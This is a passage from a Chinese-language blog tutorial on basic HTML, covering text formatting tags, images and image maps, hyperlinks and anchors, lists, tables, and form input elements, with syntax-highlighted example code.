class="tag">&lt;<span class="name">p</span>&gt;</span>我家住在大山里。你知道这里的山是什么颜色的吗？<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span> <span class="tag">&lt;<span class="name">del</span>&gt;</span>五花山<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>”。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="comment">&lt;!-- 几个标签的嵌套 --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">strong</span>&gt;</span>加粗<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> <span class="tag">&lt;<span class="name">em</span>&gt;</span>斜体<span class="tag">&lt;/<span class="name">em</span>&gt;</span> <span class="tag">&lt;<span class="name">del</span>&gt;</span>删除文字<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="comment">&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/wenben.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a>HTML 图像</h2><p> ==<strong>HTML 图像-</strong>== ：</p><ol><li>标签（ <code>&lt;img&gt;</code>）是空标签，意思是说，它只包含属性，并且没有闭合标签。</li><li>源属性（<code>&lt;src&gt;</code>）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意<strong>绝对路径和相对路径</strong>（可以用<code>../</code>来返回 一级目录，返回几级目录就写几个它就行)。</li><li>Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。<strong>==搜索引擎也是通过此描述来收集图片的==</strong>.</li><li>高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。</li></ol><p>练习：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.png"</span> <span class="attr">alt</span>=<span class="string">"chumen的qq图像"</span> <span class="attr">title</span>=<span class="string">"chumen的qq图像"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="图片的映射"><a href="#图片的映射" class="headerlink" title="图片的映射"></a>图片的映射</h4><p>目标是为了在一张图片上的<strong>某个位置</strong>点击后<strong>才</strong>可以实现某个功能。</p><p>这需要用到<code>usemap=&quot;#diyname&quot;</code> 然后用<code>&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;</code>标签来对应。</p><p>核心代码：<code>&lt;map name=&quot;1map&quot;&gt;        &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt;&lt;/map&gt;</code></p><p>shape是选择的形状，coords是坐标，坐标确定<strong>推荐用qq的截图功能那里来确定</strong>，比如：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/quzuobiao.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>那这个彩色箭头指的位置就是在这个图像的（233,456）位置。</p><p><strong>练习：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>图片的映射<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.png"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">usemap</span>=<span class="string">"#1map"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">"1map"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">"circle"</span> <span class="attr">coords</span>=<span class="string">"300,255,50"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果</strong>：<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/yingshe.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure></p><h2 id="HTML-超链接"><a href="#HTML-超链接" class="headerlink" title="HTML 超链接"></a>HTML 超链接</h2><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 <code>&lt;a&gt;</code>来设置超文本链接。</p><ul><li><p><strong>HTML 链接语法</strong>:<code>&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt;</code>  ,href 属性描述了链接的目标。</p></li><li><p><strong>target 属性</strong>  :<code>target=&quot;_blank&quot;</code>效果就是在新窗口（空白界面）做出来 。</p></li><li><p><strong>id 属性</strong>:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID:</p><p><code>&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code> </p><p>在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”:</p><p><code>&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></p></li></ul><p><strong>解释加补充</strong>：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（<code>&lt;a href=&quot;# &quot;&gt;</code>），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。</p><p><code>&lt;a name=&quot;end&quot;&gt;&lt;/a&gt;</code> <code>&lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;</code>    <strong>做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个</strong></p><p><strong>练习：</strong>（为了方便阅读，省略了很多的<code>&lt;br&gt;</code>.）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>超级链接<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.mi.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.png"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- /*书签标记：锚点*/ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#end"</span>&gt;</span>end<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">id</span>=<span class="string">"aa"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">id</span>=<span class="string">"miao"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"miao"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"end"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#miao"</span>&gt;</span>miao<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h2><ul><li><strong>HTML无序列表</strong>：<code>&lt;ul&gt;</code>与 <code>&lt;li&gt;</code>其点的样式(圆圈，圆心，正方形）用<strong>css</strong>来控制<code>&lt;ul style=&quot;list-style-type:circle&quot;&gt;</code></li><li><strong>HTML 有序列表</strong> <code>&lt;ol&gt;</code>与<code>&lt;li&gt;</code>   用法和无序相似，<strong>且有序与无序之间可以互相嵌套</strong>，<strong>嵌套过程中点的形状也会自动变化。</strong></li><li><strong>HTML 自定义列表</strong>：这个是比较常用的，自定义列表以<code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code>开始。其<strong>不仅仅是一列项目，而是项目及其注释的组合。</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">dt</span>&gt;</span>    <span class="comment">&lt;!-- 列表标题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>- black hot drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span>   <span class="comment">&lt;!-- 其内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">dt</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>- white cold drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>练习：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">style</span>=<span class="string">"list-style-type:circle"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>无序列表1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>无序列表2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>无序列表3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>无序列表4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>有序列表1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>有序列表2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>有序列表3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>有序列表4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表1<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表2<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表3<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表4<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表1<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表2<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表3<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>自定义列表4<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/liebiao.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h2><ul><li><p><strong>HTML 表格</strong>：表格由 <code>&lt;table&gt;</code>标签来定义。每个表格均有若干==行==（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干==单元格==（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指<strong>表格数据</strong>（table data），即数<strong>据单元格的内容</strong>。数据单元格可以包含<strong>文本、图片、列表、段落、表单、水平线、表格</strong>等等。这个有利于多样化，在分清栏目后在td里放内容就ok。</p></li><li><p><strong>HTML 边框属性</strong>:<code>&lt;table border=&quot;1&quot;&gt;</code>会出现表框。</p></li><li><p><strong>HTML 表格表头</strong>:表格的表头使用 <code>&lt;th&gt;</code> 标签进行定义。<code>&lt;th&gt;</code>标签与<code>&lt;td&gt;</code>标签<strong>用法相似只是显示的效果不同，会有粗体居中的效果；</strong></p></li><li><p><strong>HTML表格合并</strong>：用 <strong>colspan</strong>： 横向行  <strong>rowspan</strong>  ：竖纵行。</p></li><li><p><strong>HTML表格单元格边距的设置</strong>：类似 <strong>设置边框</strong> 直接在table标签里放入<strong>cellpadding=“自定义的数字”</strong>，就设置好了。</p></li></ul><p><strong>练习：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">th</span>&gt;</span>部门<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">th</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">th</span>&gt;</span>工资<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"3"</span>&gt;</span>开发组<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span>&gt;</span>小明<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span>&gt;</span>男<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span>&gt;</span>1w<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span>&gt;</span>小白<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span>&gt;</span>女<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span>&gt;</span>1w<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>工资合计<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">td</span>&gt;</span>2w<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaoge.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h2><p>表单是一个包含<strong>表单元素</strong>的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。</p><p>`<form><br>input元素</form></p>`<h4 id="HTML-表单-输入元素"><a href="#HTML-表单-输入元素" class="headerlink" title="HTML 表单 - 输入元素"></a>HTML 表单 - 输入元素</h4><p>输入标签<code>&lt;input&gt;</code>。</p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt;</code> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><p>`<form><br>First name: <input type="text" name="firstname"><br><br>Last name: <input type="text" name="lastname"></form></p>`<p><strong>在大多数浏览器中，文本域的缺省宽度是20个字符。</strong></p><h4 id="密码字段"><a href="#密码字段" class="headerlink" title="密码字段"></a>密码字段</h4><p><code>&lt;input type=&quot;password&quot;&gt;</code> 来定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p><code>&lt;input type=&quot;radio&quot;&gt;</code> 标签定义了表单单选框选项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"male"</span>&gt;</span>Male<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span></span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">"female"</span>&gt;</span>Female</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Name 是可以进行==分组==。想要有效果 value也少不了。</strong></p><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><p><code>&lt;input type=&quot;checkbox&quot;&gt;</code>定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"vehicle"</span> <span class="attr">value</span>=<span class="string">"Bike"</span>&gt;</span>I have a bike<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"vehicle"</span> <span class="attr">value</span>=<span class="string">"Car"</span>&gt;</span>I have a car </span><br><span class="line"><span class="tag">&lt;/<span 